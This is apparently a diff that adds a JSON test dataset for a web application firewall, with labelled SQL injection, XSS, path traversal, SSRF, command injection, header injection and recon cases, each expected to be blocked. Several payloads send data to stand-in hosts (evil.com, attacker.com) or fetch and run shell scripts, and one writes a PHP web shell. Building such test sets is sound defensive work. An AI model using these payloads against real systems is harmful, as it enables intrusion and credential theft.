@@ -1,0 +1,1024 @@
+{
+  "_meta": {
+    "version": "3.0",
+    "created": "2026-05-08",
+    "contract": "EN_waf_interop_contract_v2.3",
+    "description": "Comprehensive attack dataset — 220 cases across 20 attack classes. Designed for maximum coverage of OWASP Top-10, evasion techniques, emerging vectors, and framework-specific probes. All cases expect X-WAF-Action: block unless noted.",
+    "total_cases": 220,
+    "classes": [
+      "sqli", "xss", "path_traversal", "ssrf", "cmdi", "header_injection",
+      "recon", "xxe", "ssti", "ldap_injection", "nosql_injection",
+      "log4shell", "open_redirect", "http_smuggling", "graphql",
+      "jwt_abuse", "prototype_pollution", "xxs_dom", "rce_deserialization", "websocket"
+    ]
+  },
+
+  "sqli": {
+    "description": "SQL injection — classic, blind, time-based, stacked, OOB, second-order, polyglot",
+    "cases": [
+      {
+        "id": "sqli-001", "label": "Classic OR 1=1",
+        "method": "GET", "path": "/login", "query": "u=admin'%20OR%20'1'='1",
+        "expected_action": "block", "expected_rule": "sqli"
+      },
+      {
+        "id": "sqli-002", "label": "UNION SELECT version()",
+        "method": "GET", "path": "/search", "query": "q=1%20UNION%20SELECT%20null%2Cversion()%2Cnull--",
+        "expected_action": "block", "expected_rule": "sqli"
+      },
+      {
+        "id": "sqli-003", "label": "Stacked query DROP TABLE",
+        "method": "GET", "path": "/api/user", "query": "id=1%3B%20DROP%20TABLE%20users--",
+        "expected_action": "block", "expected_rule": "sqli"
+      },
+      {
+        "id": "sqli-004", "label": "Blind boolean-based",
+        "method": "GET", "path": "/api/item", "query": "id=1%20AND%201=1",
+        "expected_action": "block", "expected_rule": "sqli"
+      },
+      {
+        "id": "sqli-005", "label": "Time-based blind SLEEP",
+        "method": "GET", "path": "/api/item", "query": "id=1%3B%20WAITFOR%20DELAY%20'0:0:5'--",
+        "expected_action": "block", "expected_rule": "sqli"
+      },
+      {
+        "id": "sqli-006", "label": "Time-based MySQL SLEEP",
+        "method": "GET", "path": "/api/item", "query": "id=1%20AND%20SLEEP(5)--",
+        "expected_action": "block", "expected_rule": "sqli"
+      },
+      {
+        "id": "sqli-007", "label": "Out-of-band DNS exfil",
+        "method": "GET", "path": "/api/item", "query": "id=1%3B%20EXEC%20xp_dirtree('//'||version()||'.attacker.com/a')--",
+        "expected_action": "block", "expected_rule": "sqli"
+      },
+      {
+        "id": "sqli-008", "label": "Comment evasion /* */",
+        "method": "GET", "path": "/search", "query": "q=1/**/UNION/**/SELECT/**/null,user()--",
+        "expected_action": "block", "expected_rule": "sqli"
+      },
+      {
+        "id": "sqli-009", "label": "Case evasion SeLeCt",
+        "method": "GET", "path": "/search", "query": "q=1+SeLeCt+null,version()--",
+        "expected_action": "block", "expected_rule": "sqli"
+      },
+      {
+        "id": "sqli-010", "label": "Double URL-encode %2527",
+        "method": "GET", "path": "/api/user", "query": "id=1%2527%2520OR%2520%25271%2527%253D%25271",
+        "expected_action": "block", "expected_rule": "sqli"
+      },
+      {
+        "id": "sqli-011", "label": "JSON body injection",
+        "method": "POST", "path": "/api/login",
+        "body": "{\"username\":\"admin' OR '1'='1\",\"password\":\"x\"}",
+        "content_type": "application/json",
+        "expected_action": "block", "expected_rule": "sqli"
+      },
+      {
+        "id": "sqli-012", "label": "Form POST injection",
+        "method": "POST", "path": "/login",
+        "body": "username=admin'+OR+'1'%3D'1&password=x",
+        "content_type": "application/x-www-form-urlencoded",
+        "expected_action": "block", "expected_rule": "sqli"
+      },
+      {
+        "id": "sqli-013", "label": "INFORMATION_SCHEMA dump",
+        "method": "GET", "path": "/api/tables", "query": "q=UNION+SELECT+table_name+FROM+information_schema.tables--",
+        "expected_action": "block", "expected_rule": "sqli"
+      },
+      {
+        "id": "sqli-014", "label": "Error-based ExtractValue",
+        "method": "GET", "path": "/search", "query": "q=1+AND+EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
+        "expected_action": "block", "expected_rule": "sqli"
+      },
+      {
+        "id": "sqli-015", "label": "Hex-encoded payload",
+        "method": "GET", "path": "/api/item", "query": "id=0x31+OR+0x31%3D0x31",
+        "expected_action": "block", "expected_rule": "sqli"
+      },
+      {
+        "id": "sqli-016", "label": "Second-order stored in name field",
+        "method": "POST", "path": "/api/profile",
+        "body": "{\"name\":\"admin'--\",\"email\":\"x@x.com\"}",
+        "content_type": "application/json",
+        "expected_action": "block", "expected_rule": "sqli"
+      },
+      {
+        "id": "sqli-017", "label": "PostgreSQL casting",
+        "method": "GET", "path": "/search", "query": "q=1+UNION+SELECT+NULL::text,version()::text--",
+        "expected_action": "block", "expected_rule": "sqli"
+      },
+      {
+        "id": "sqli-018", "label": "SQLite-specific",
+        "method": "GET", "path": "/api/item", "query": "id=1+UNION+SELECT+sqlite_version(),null--",
+        "expected_action": "block", "expected_rule": "sqli"
+      },
+      {
+        "id": "sqli-019", "label": "HAVING clause injection",
+        "method": "GET", "path": "/api/stats", "query": "group=dept+HAVING+1=1--",
+        "expected_action": "block", "expected_rule": "sqli"
+      },
+      {
+        "id": "sqli-020", "label": "ORDER BY column number",
+        "method": "GET", "path": "/api/users", "query": "sort=1+ORDER+BY+1--",
+        "expected_action": "block", "expected_rule": "sqli"
+      },
+      {
+        "id": "sqli-021", "label": "Newline obfuscation",
+        "method": "GET", "path": "/search", "query": "q=1%0AUNION%0ASELECT%0Anull,version()--",
+        "expected_action": "block", "expected_rule": "sqli"
+      },
+      {
+        "id": "sqli-022", "label": "Tab obfuscation",
+        "method": "GET", "path": "/search", "query": "q=1%09UNION%09SELECT%09null,version()--",
+        "expected_action": "block", "expected_rule": "sqli"
+      },
+      {
+        "id": "sqli-023", "label": "Concat-based fingerprint",
+        "method": "GET", "path": "/api/item", "query": "id=1+AND+1=CONCAT(1,0)--",
+        "expected_action": "block", "expected_rule": "sqli"
+      },
+      {
+        "id": "sqli-024", "label": "LOAD_FILE exfil",
+        "method": "GET", "path": "/api/item", "query": "id=1+UNION+SELECT+LOAD_FILE('/etc/passwd'),null--",
+        "expected_action": "block", "expected_rule": "sqli"
+      },
+      {
+        "id": "sqli-025", "label": "INTO OUTFILE write",
+        "method": "GET", "path": "/api/item", "query": "id=1+UNION+SELECT+null,'<?php system($_GET[c]);?>'+INTO+OUTFILE+'/var/www/html/shell.php'--",
+        "expected_action": "block", "expected_rule": "sqli"
+      }
+    ]
+  },
+
+  "xss": {
+    "description": "Cross-site scripting — reflected, stored, DOM, CSP bypass, polyglot, SVG, MathML, event handlers",
+    "cases": [
+      {
+        "id": "xss-001", "label": "Classic script tag",
+        "method": "GET", "path": "/search", "query": "q=%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+        "expected_action": "block", "expected_rule": "xss"
+      },
+      {
+        "id": "xss-002", "label": "IMG onerror",
+        "method": "GET", "path": "/", "query": "x=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E",
+        "expected_action": "block", "expected_rule": "xss"
+      },
+      {
+        "id": "xss-003", "label": "SVG onload",
+        "method": "GET", "path": "/search", "query": "q=%3Csvg+onload%3Dalert%281%29%3E",
+        "expected_action": "block", "expected_rule": "xss"
+      },
+      {
+        "id": "xss-004", "label": "SVG animate",
+        "method": "GET", "path": "/search", "query": "q=%3Csvg%3E%3Canimate+onbegin%3Dalert(1)+attributeName%3Dx%3E",
+        "expected_action": "block", "expected_rule": "xss"
+      },
+      {
+        "id": "xss-005", "label": "MathML annotation",
+        "method": "GET", "path": "/search", "query": "q=%3Cmath%3E%3Cmi+xlink%3Ahref%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert(1)%3C%2Fscript%3E%22%3E",
+        "expected_action": "block", "expected_rule": "xss"
+      },
+      {
+        "id": "xss-006", "label": "JavaScript URI",
+        "method": "GET", "path": "/redirect", "query": "url=javascript%3Aalert(document.cookie)",
+        "expected_action": "block", "expected_rule": "xss"
+      },
+      {
+        "id": "xss-007", "label": "Data URI HTML",
+        "method": "GET", "path": "/redirect", "query": "url=data%3Atext%2Fhtml%2C%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+        "expected_action": "block", "expected_rule": "xss"
+      },
+      {
+        "id": "xss-008", "label": "Iframe srcdoc",
+        "method": "GET", "path": "/", "query": "x=%3Ciframe+srcdoc%3D%22%3Cscript%3Ealert(1)%3C%2Fscript%3E%22%3E",
+        "expected_action": "block", "expected_rule": "xss"
+      },
+      {
+        "id": "xss-009", "label": "Body onload",
+        "method": "GET", "path": "/", "query": "x=%3Cbody+onload%3Dalert(1)%3E",
+        "expected_action": "block", "expected_rule": "xss"
+      },
+      {
+        "id": "xss-010", "label": "Input autofocus onfocus",
+        "method": "GET", "path": "/", "query": "x=%3Cinput+autofocus+onfocus%3Dalert(1)%3E",
+        "expected_action": "block", "expected_rule": "xss"
+      },
+      {
+        "id": "xss-011", "label": "Details ontoggle",
+        "method": "GET", "path": "/", "query": "x=%3Cdetails+open+ontoggle%3Dalert(1)%3E",
+        "expected_action": "block", "expected_rule": "xss"
+      },
+      {
+        "id": "xss-012", "label": "Template tag",
+        "method": "GET", "path": "/", "query": "x=%3Ctemplate%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E%3C%2Ftemplate%3E",
+        "expected_action": "block", "expected_rule": "xss"
+      },
+      {
+        "id": "xss-013", "label": "Unicode escape \\u003c",
+        "method": "GET", "path": "/search", "query": "q=\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
+        "expected_action": "block", "expected_rule": "xss"
+      },
+      {
+        "id": "xss-014", "label": "HTML entities &#60;script&#62;",
+        "method": "GET", "path": "/search", "query": "q=&#60;script&#62;alert(1)&#60;/script&#62;",
+        "expected_action": "block", "expected_rule": "xss"
+      },
+      {
+        "id": "xss-015", "label": "Hex entities &#x3C;",
+        "method": "GET", "path": "/search", "query": "q=&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
+        "expected_action": "block", "expected_rule": "xss"
+      },
+      {
+        "id": "xss-016", "label": "fetch() cookie exfil",
+        "method": "GET", "path": "/", "query": "x=%3Cscript%3Efetch('https://evil.com/'+%2Bdocument.cookie)%3C%2Fscript%3E",
+        "expected_action": "block", "expected_rule": "xss"
+      },
+      {
+        "id": "xss-017", "label": "Mutation XSS noscript",
+        "method": "GET", "path": "/", "query": "x=%3Cnoscript%3E%3Cp+title%3D%22%3C%2Fnoscript%3E%3Cimg+src%3Dx+onerror%3Dalert(1)%3E%22%3E",
+        "expected_action": "block", "expected_rule": "xss"
+      },
+      {
+        "id": "xss-018", "label": "Object tag classid",
+        "method": "GET", "path": "/", "query": "x=%3Cobject+data%3D%22javascript%3Aalert(1)%22%3E%3C%2Fobject%3E",
+        "expected_action": "block", "expected_rule": "xss"
+      },
+      {
+        "id": "xss-019", "label": "Link rel stylesheet",
+        "method": "GET", "path": "/", "query": "x=%3Clink+rel%3Dstylesheet+href%3D'//evil.com/x.css'%3E",
+        "expected_action": "block", "expected_rule": "xss"
+      },
+      {
+        "id": "xss-020", "label": "XSS in JSON body",
+        "method": "POST", "path": "/api/comment",
+        "body": "{\"text\":\"<script>alert(1)</script>\",\"post\":1}",
+        "content_type": "application/json",
+        "expected_action": "block", "expected_rule": "xss"
+      },
+      {
+        "id": "xss-021", "label": "XSS in HTTP header value",
+        "method": "GET", "path": "/",
+        "headers": {"Referer": "<script>alert(1)</script>"},
+        "expected_action": "block", "expected_rule": "xss"
+      },
+      {
+        "id": "xss-022", "label": "XSS polyglot all-in-one",
+        "method": "GET", "path": "/search", "query": "q=jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*+*/oNcliCk=alert(1)+)//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>%3CsVg/<sVg/oNloAd=alert(1)//>",
+        "expected_action": "block", "expected_rule": "xss"
+      },
+      {
+        "id": "xss-023", "label": "CSS expression() IE",
+        "method": "GET", "path": "/", "query": "x=%3Cstyle%3Ebody%7Bcolor%3Aexpression(alert(1))%7D%3C%2Fstyle%3E",
+        "expected_action": "block", "expected_rule": "xss"
+      },
+      {
+        "id": "xss-024", "label": "Null byte injection",
+        "method": "GET", "path": "/search", "query": "q=%3Cscr%00ipt%3Ealert(1)%3C%2Fscript%3E",
+        "expected_action": "block", "expected_rule": "xss"
+      },
+      {
+        "id": "xss-025", "label": "Tab-in-tag evasion",
+        "method": "GET", "path": "/search", "query": "q=%3Cscript%09type%3Dtext%2Fjavascript%3Ealert(1)%3C%2Fscript%3E",
+        "expected_action": "block", "expected_rule": "xss"
+      }
+    ]
+  },
+
+  "path_traversal": {
+    "description": "Path traversal — classic, encoded, double-encoded, Windows, null byte, beyond-root, absolute path",
+    "cases": [
+      {
+        "id": "pt-001", "label": "Classic ../etc/passwd",
+        "method": "GET", "path": "/files", "query": "p=../../../../etc/passwd",
+        "expected_action": "block", "expected_rule": "path_traversal"
+      },
+      {
+        "id": "pt-002", "label": "URL-encoded %2e%2e",
+        "method": "GET", "path": "/download", "query": "file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+        "expected_action": "block", "expected_rule": "path_traversal"
+      },
+      {
+        "id": "pt-003", "label": "Double-encoded %252e",
+        "method": "GET", "path": "/download", "query": "file=%252e%252e%252f%252e%252e%252fetc%252fpasswd",
+        "expected_action": "block", "expected_rule": "path_traversal"
+      },
+      {
+        "id": "pt-004", "label": "Windows backslash ..\\",
+        "method": "GET", "path": "/download", "query": "file=..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts",
+        "expected_action": "block", "expected_rule": "path_traversal"
+      },
+      {
+        "id": "pt-005", "label": "Mixed slash ..%2F..\\",
+        "method": "GET", "path": "/load", "query": "f=..%2F..%5c..%2Fetc%2Fpasswd",
+        "expected_action": "block", "expected_rule": "path_traversal"
+      },
+      {
+        "id": "pt-006", "label": "Null byte bypass",
+        "method": "GET", "path": "/files", "query": "f=../../../../etc/passwd%00.png",
+        "expected_action": "block", "expected_rule": "path_traversal"
+      },
+      {
+        "id": "pt-007", "label": "Beyond-root /../../../",
+        "method": "GET", "path": "/files", "query": "f=/../../../etc/shadow",
+        "expected_action": "block", "expected_rule": "path_traversal"
+      },
+      {
+        "id": "pt-008", "label": "Absolute path /etc/passwd",
+        "method": "GET", "path": "/read", "query": "path=/etc/passwd",
+        "expected_action": "block", "expected_rule": "path_traversal"
+      },
+      {
+        "id": "pt-009", "label": "/etc/shadow",
+        "method": "GET", "path": "/docs", "query": "file=../../../../etc/shadow",
+        "expected_action": "block", "expected_rule": "path_traversal"
+      },
+      {
+        "id": "pt-010", "label": "/proc/self/environ",
+        "method": "GET", "path": "/files", "query": "p=../../../../proc/self/environ",
+        "expected_action": "block", "expected_rule": "path_traversal"
+      },
+      {
+        "id": "pt-011", "label": "/proc/self/cmdline",
+        "method": "GET", "path": "/files", "query": "p=../../../../proc/self/cmdline",
+        "expected_action": "block", "expected_rule": "path_traversal"
+      },
+      {
+        "id": "pt-012", "label": "Windows SAM database",
+        "method": "GET", "path": "/download", "query": "f=..%5c..%5cwindows%5csystem32%5cconfig%5cSAM",
+        "expected_action": "block", "expected_rule": "path_traversal"
+      },
+      {
+        "id": "pt-013", "label": "Unicode overlong %c0%af",
+        "method": "GET", "path": "/files", "query": "f=%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd",
+        "expected_action": "block", "expected_rule": "path_traversal"
+      },
+      {
+        "id": "pt-014", "label": "Dot-dot in path segment",
+        "method": "GET", "path": "/files/../../../etc/passwd",
+        "expected_action": "block", "expected_rule": "path_traversal"
+      },
+      {
+        "id": "pt-015", "label": "Zip slip style",
+        "method": "POST", "path": "/api/extract",
+        "body": "{\"filename\":\"../../../../etc/cron.d/shell\",\"content\":\"* * * * * root curl evil.com|sh\"}",
+        "content_type": "application/json",
+        "expected_action": "block", "expected_rule": "path_traversal"
+      }
+    ]
+  },
+
+  "ssrf": {
+    "description": "Server-side request forgery — cloud metadata, internal services, DNS rebinding, URL credentials, protocol abuse",
+    "cases": [
+      {
+        "id": "ssrf-001", "label": "AWS IMDS v1",
+        "method": "GET", "path": "/api/fetch", "query": "url=http://169.254.169.254/latest/meta-data/",
+        "expected_action": "block", "expected_rule": "ssrf"
+      },
+      {
+        "id": "ssrf-002", "label": "AWS IMDS token endpoint",
+        "method": "GET", "path": "/api/fetch", "query": "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        "expected_action": "block", "expected_rule": "ssrf"
+      },
+      {
+        "id": "ssrf-003", "label": "GCP metadata",
+        "method": "GET", "path": "/proxy", "query": "target=http://metadata.google.internal/computeMetadata/v1/",
+        "expected_action": "block", "expected_rule": "ssrf"
+      },
+      {
+        "id": "ssrf-004", "label": "Azure IMDS",
+        "method": "GET", "path": "/proxy", "query": "target=http://169.254.169.254/metadata/instance",
+        "expected_action": "block", "expected_rule": "ssrf"
+      },
+      {
+        "id": "ssrf-005", "label": "Localhost admin plane",
+        "method": "GET", "path": "/api/proxy", "query": "dest=http://127.0.0.1:9443/api/config",
+        "expected_action": "block", "expected_rule": "ssrf"
+      },
+      {
+        "id": "ssrf-006", "label": "Internal 10.0.0.1",
+        "method": "GET", "path": "/api/webhook", "query": "callback=http://10.0.0.1:8080/admin",
+        "expected_action": "block", "expected_rule": "ssrf"
+      },
+      {
+        "id": "ssrf-007", "label": "Internal 192.168.0.1",
+        "method": "GET", "path": "/api/image", "query": "src=http://192.168.0.1/router-config",
+        "expected_action": "block", "expected_rule": "ssrf"
+      },
+      {
+        "id": "ssrf-008", "label": "file:// protocol",
+        "method": "GET", "path": "/api/render", "query": "url=file:///etc/passwd",
+        "expected_action": "block", "expected_rule": "ssrf"
+      },
+      {
+        "id": "ssrf-009", "label": "gopher:// protocol",
+        "method": "GET", "path": "/api/proxy", "query": "url=gopher://127.0.0.1:6379/_FLUSHALL%0D%0A",
+        "expected_action": "block", "expected_rule": "ssrf"
+      },
+      {
+        "id": "ssrf-010", "label": "dict:// protocol",
+        "method": "GET", "path": "/api/fetch", "query": "url=dict://127.0.0.1:11211/stat",
+        "expected_action": "block", "expected_rule": "ssrf"
+      },
+      {
+        "id": "ssrf-011", "label": "URL with credentials",
+        "method": "GET", "path": "/api/fetch", "query": "url=http://admin:password@192.168.1.1/",
+        "expected_action": "block", "expected_rule": "ssrf"
+      },
+      {
+        "id": "ssrf-012", "label": "Decimal IP 2130706433",
+        "method": "GET", "path": "/api/fetch", "query": "url=http://2130706433/admin",
+        "expected_action": "block", "expected_rule": "ssrf"
+      },
+      {
+        "id": "ssrf-013", "label": "Octal IP 0177.0.0.1",
+        "method": "GET", "path": "/api/fetch", "query": "url=http://0177.0.0.1/",
+        "expected_action": "block", "expected_rule": "ssrf"
+      },
+      {
+        "id": "ssrf-014", "label": "IPv6 loopback",
+        "method": "GET", "path": "/api/fetch", "query": "url=http://[::1]:9443/api/config",
+        "expected_action": "block", "expected_rule": "ssrf"
+      },
+      {
+        "id": "ssrf-015", "label": "Redirect SSRF chain",
+        "method": "GET", "path": "/api/webhook",
+        "query": "callback=http://evil.com/redirect?to=http://169.254.169.254/",
+        "expected_action": "block", "expected_rule": "ssrf"
+      },
+      {
+        "id": "ssrf-016", "label": "JSON body SSRF",
+        "method": "POST", "path": "/api/webhooks",
+        "body": "{\"callback_url\":\"http://169.254.169.254/latest/meta-data/\"}",
+        "content_type": "application/json",
+        "expected_action": "block", "expected_rule": "ssrf"
+      },
+      {
+        "id": "ssrf-017", "label": "SVG external entity via img",
+        "method": "GET", "path": "/api/render", "query": "src=http://169.254.169.254/",
+        "expected_action": "block", "expected_rule": "ssrf"
+      },
+      {
+        "id": "ssrf-018", "label": "DNS rebinding via subpath",
+        "method": "GET", "path": "/proxy", "query": "host=169.254.169.254&path=/latest/meta-data",
+        "expected_action": "block", "expected_rule": "ssrf"
+      }
+    ]
+  },
+
+  "command_injection": {
+    "description": "OS command injection — Unix/Windows, semicolon, pipe, backtick, $(), substitution, blind",
+    "cases": [
+      {
+        "id": "cmdi-001", "label": "Semicolon chaining",
+        "method": "GET", "path": "/api/ping", "query": "host=127.0.0.1;id",
+        "expected_action": "block", "expected_rule": "command_injection"
+      },
+      {
+        "id": "cmdi-002", "label": "Pipe to shell",
+        "method": "GET", "path": "/api/ping", "query": "host=127.0.0.1|id",
+        "expected_action": "block", "expected_rule": "command_injection"
+      },
+      {
+        "id": "cmdi-003", "label": "Backtick substitution",
+        "method": "GET", "path": "/api/dig", "query": "domain=`id`",
+        "expected_action": "block", "expected_rule": "command_injection"
+      },
+      {
+        "id": "cmdi-004", "label": "$() substitution",
+        "method": "GET", "path": "/api/exec", "query": "cmd=$(id)",
+        "expected_action": "block", "expected_rule": "command_injection"
+      },
+      {
+        "id": "cmdi-005", "label": "&& chain",
+        "method": "GET", "path": "/api/convert", "query": "input=file.pdf&&cat+/etc/passwd",
+        "expected_action": "block", "expected_rule": "command_injection"
+      },
+      {
+        "id": "cmdi-006", "label": "|| fallback",
+        "method": "GET", "path": "/api/lookup", "query": "host=invalid||cat+/etc/passwd",
+        "expected_action": "block", "expected_rule": "command_injection"
+      },
+      {
+        "id": "cmdi-007", "label": "Newline injection",
+        "method": "GET", "path": "/api/lookup", "query": "host=127.0.0.1%0Aid",
+        "expected_action": "block", "expected_rule": "command_injection"
+      },
+      {
+        "id": "cmdi-008", "label": "Windows cmd & dir",
+        "method": "GET", "path": "/api/ping", "query": "host=127.0.0.1&dir+C:\\",
+        "expected_action": "block", "expected_rule": "command_injection"
+      },
+      {
+        "id": "cmdi-009", "label": "curl exfil",
+        "method": "GET", "path": "/api/exec", "query": "arg=;curl+http://evil.com/$(cat+/etc/passwd)",
+        "expected_action": "block", "expected_rule": "command_injection"
+      },
+      {
+        "id": "cmdi-010", "label": "wget reverse shell",
+        "method": "GET", "path": "/api/convert", "query": "src=;wget+http://evil.com/shell.sh+-O+/tmp/s;bash+/tmp/s",
+        "expected_action": "block", "expected_rule": "command_injection"
+      },
+      {
+        "id": "cmdi-011", "label": "Python reverse shell",
+        "method": "POST", "path": "/api/script",
+        "body": "{\"code\":\"import os;os.system('id')\"}",
+        "content_type": "application/json",
+        "expected_action": "block", "expected_rule": "command_injection"
+      },
+      {
+        "id": "cmdi-012", "label": "Blind time-based sleep",
+        "method": "GET", "path": "/api/ping", "query": "host=127.0.0.1;sleep+5",
+        "expected_action": "block", "expected_rule": "command_injection"
+      },
+      {
+        "id": "cmdi-013", "label": "IFS bypass",
+        "method": "GET", "path": "/api/exec", "query": "cmd=${IFS}id${IFS}",
+        "expected_action": "block", "expected_rule": "command_injection"
+      },
+      {
+        "id": "cmdi-014", "label": "Brace expansion",
+        "method": "GET", "path": "/api/exec", "query": "cmd={id,}",
+        "expected_action": "block", "expected_rule": "command_injection"
+      },
+      {
+        "id": "cmdi-015", "label": "Env variable expansion",
+        "method": "GET", "path": "/api/exec", "query": "arg=$PATH;cat+/etc/passwd",
+        "expected_action": "block", "expected_rule": "command_injection"
+      }
+    ]
+  },
+
+  "header_injection": {
+    "description": "Header injection — CRLF, host override, cache poisoning, request splitting, X-Forwarded-Host",
+    "cases": [
+      {
+        "id": "hdrx-001", "label": "CRLF redirect injection",
+        "method": "GET", "path": "/redirect", "query": "url=http://example.com%0d%0aSet-Cookie%3A+malicious%3D1",
+        "expected_action": "block", "expected_rule": "header_injection"
+      },
+      {
+        "id": "hdrx-002", "label": "CRLF log injection via param",
+        "method": "GET", "path": "/api/log", "query": "msg=hello%0d%0aX-Injected%3A+evil",
+        "expected_action": "block", "expected_rule": "header_injection"
+      },
+      {
+        "id": "hdrx-003", "label": "Host header CRLF",
+        "method": "GET", "path": "/",
+        "headers": {"Host": "evil.com\r\nX-Injected: pwned"},
+        "expected_action": "block", "expected_rule": "header_injection"
+      },
+      {
+        "id": "hdrx-004", "label": "X-Forwarded-Host poisoning",
+        "method": "GET", "path": "/",
+        "headers": {"X-Forwarded-Host": "evil.com"},
+        "expected_action": "block", "expected_rule": "header_injection",
+        "notes": "Host override for cache poisoning"
+      },
+      {
+        "id": "hdrx-005", "label": "HTTP response splitting",
+        "method": "GET", "path": "/search", "query": "q=test%0d%0aContent-Length%3A+0%0d%0a%0d%0aHTTP%2F1.1+200+OK",
+        "expected_action": "block", "expected_rule": "header_injection"
+      },
+      {
+        "id": "hdrx-006", "label": "User-Agent CRLF",
+        "method": "GET", "path": "/",
+        "headers": {"User-Agent": "Mozilla/5.0\r\nX-Injected: evil"},
+        "expected_action": "block", "expected_rule": "header_injection"
+      },
+      {
+        "id": "hdrx-007", "label": "Referer CRLF",
+        "method": "GET", "path": "/",
+        "headers": {"Referer": "https://example.com\r\nX-Admin: true"},
+        "expected_action": "block", "expected_rule": "header_injection"
+      },
+      {
+        "id": "hdrx-008", "label": "X-Original-URL override",
+        "method": "GET", "path": "/public",
+        "headers": {"X-Original-URL": "/admin/config"},
+        "expected_action": "block", "expected_rule": "header_injection"
+      },
+      {
+        "id": "hdrx-009", "label": "X-Rewrite-URL override",
+        "method": "GET", "path": "/public",
+        "headers": {"X-Rewrite-URL": "/admin/config"},
+        "expected_action": "block", "expected_rule": "header_injection"
+      },
+      {
+        "id": "hdrx-010", "label": "Newline in Cookie header",
+        "method": "GET", "path": "/",
+        "headers": {"Cookie": "session=abc\r\nX-Admin: true"},
+        "expected_action": "block", "expected_rule": "header_injection"
+      }
+    ]
+  },
+
+  "recon": {
+    "description": "Recon paths — classic sensitive files, framework endpoints, cloud-native, CI/CD, admin panels",
+    "cases": [
+      {"id": "recon-001", "label": ".env file", "method": "GET", "path": "/.env", "expected_action": "block", "expected_rule": "recon_path"},
+      {"id": "recon-002", "label": ".git/config", "method": "GET", "path": "/.git/config", "expected_action": "block", "expected_rule": "recon_path"},
+      {"id": "recon-003", "label": ".git/HEAD", "method": "GET", "path": "/.git/HEAD", "expected_action": "block", "expected_rule": "recon_path"},
+      {"id": "recon-004", "label": ".svn/entries", "method": "GET", "path": "/.svn/entries", "expected_action": "block", "expected_rule": "recon_path"},
+      {"id": "recon-005", "label": "wp-admin", "method": "GET", "path": "/wp-admin/", "expected_action": "block", "expected_rule": "recon_path"},
+      {"id": "recon-006", "label": "wp-config.php", "method": "GET", "path": "/wp-config.php", "expected_action": "block", "expected_rule": "recon_path"},
+      {"id": "recon-007", "label": "phpinfo", "method": "GET", "path": "/phpinfo.php", "expected_action": "block", "expected_rule": "recon_path"},
+      {"id": "recon-008", "label": "phpmyadmin", "method": "GET", "path": "/phpmyadmin/", "expected_action": "block", "expected_rule": "recon_path"},
+      {"id": "recon-009", "label": ".aws/credentials", "method": "GET", "path": "/.aws/credentials", "expected_action": "block", "expected_rule": "recon_path"},
+      {"id": "recon-010", "label": ".ssh/id_rsa", "method": "GET", "path": "/.ssh/id_rsa", "expected_action": "block", "expected_rule": "recon_path"},
+      {"id": "recon-011", "label": "Spring Boot /actuator", "method": "GET", "path": "/actuator", "expected_action": "block", "expected_rule": "recon_path", "notes": "GAP-001"},
+      {"id": "recon-012", "label": "Spring Boot /actuator/env", "method": "GET", "path": "/actuator/env", "expected_action": "block", "expected_rule": "recon_path", "notes": "GAP-001"},
+      {"id": "recon-013", "label": "Spring Boot /actuator/heapdump", "method": "GET", "path": "/actuator/heapdump", "expected_action": "block", "expected_rule": "recon_path", "notes": "GAP-001"},
+      {"id": "recon-014", "label": "Spring Boot /actuator/shutdown", "method": "POST", "path": "/actuator/shutdown", "expected_action": "block", "expected_rule": "recon_path", "notes": "GAP-001"},
+      {"id": "recon-015", "label": "Spring Boot /actuator/mappings", "method": "GET", "path": "/actuator/mappings", "expected_action": "block", "expected_rule": "recon_path", "notes": "GAP-001"},
+      {"id": "recon-016", "label": "Laravel /_ignition/execute-solution", "method": "POST", "path": "/_ignition/execute-solution", "expected_action": "block", "expected_rule": "recon_path", "notes": "GAP-001"},
+      {"id": "recon-017", "label": "Laravel /_ignition/health-check", "method": "GET", "path": "/_ignition/health-check", "expected_action": "block", "expected_rule": "recon_path", "notes": "GAP-001"},
+      {"id": "recon-018", "label": "Swagger /swagger-ui.html", "method": "GET", "path": "/swagger-ui.html", "expected_action": "block", "expected_rule": "recon_path", "notes": "GAP-001"},
+      {"id": "recon-019", "label": "Swagger /v3/api-docs", "method": "GET", "path": "/v3/api-docs", "expected_action": "block", "expected_rule": "recon_path", "notes": "GAP-001"},
+      {"id": "recon-020", "label": "Swagger /api-docs", "method": "GET", "path": "/api-docs", "expected_action": "block", "expected_rule": "recon_path", "notes": "GAP-001"},
+      {"id": "recon-021", "label": "GraphQL introspection query", "method": "POST", "path": "/graphql", "body": "{\"query\":\"{__schema{types{name}}}\",\"variables\":{}}", "content_type": "application/json", "expected_action": "block", "expected_rule": "recon_path", "notes": "GAP-001"},
+      {"id": "recon-022", "label": "GraphQL /graphiql", "method": "GET", "path": "/graphiql", "expected_action": "block", "expected_rule": "recon_path", "notes": "GAP-001"},
+      {"id": "recon-023", "label": "K8s /api/v1/namespaces", "method": "GET", "path": "/api/v1/namespaces", "expected_action": "block", "expected_rule": "recon_path", "notes": "GAP-001"},
+      {"id": "recon-024", "label": "K8s /healthz", "method": "GET", "path": "/healthz", "expected_action": "block", "expected_rule": "recon_path", "notes": "GAP-001"},
+      {"id": "recon-025", "label": "Prometheus /metrics", "method": "GET", "path": "/metrics", "expected_action": "block", "expected_rule": "recon_path", "notes": "GAP-001"},
+      {"id": "recon-026", "label": "Kibana /app/kibana", "method": "GET", "path": "/app/kibana", "expected_action": "block", "expected_rule": "recon_path", "notes": "GAP-001"},
+      {"id": "recon-027", "label": "Elasticsearch /_cat/indices", "method": "GET", "path": "/_cat/indices", "expected_action": "block", "expected_rule": "recon_path", "notes": "GAP-001"},
+      {"id": "recon-028", "label": "Elasticsearch /_nodes", "method": "GET", "path": "/_nodes", "expected_action": "block", "expected_rule": "recon_path", "notes": "GAP-001"},
